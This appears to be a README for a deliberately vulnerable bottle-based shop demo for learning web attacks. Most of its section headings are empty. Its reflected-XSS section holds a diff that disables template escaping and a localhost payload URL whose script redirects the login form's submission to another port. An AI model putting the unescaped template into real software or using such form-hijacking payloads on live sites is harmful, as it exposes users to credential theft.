# bottle-store
 EC site example using Python bottle.

# SQL Injection

# Reflected XSS

```diff:app.py
-<p style="color:red;"> {{ message }} </p>
+<p style="color:red;"> {{ !message }} </p>
```

```
http://localhost:8080/login?message=<s>hello</s>
```

```
http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
```

# Persistent XSS

# DOM based XSS

# Clickjucking

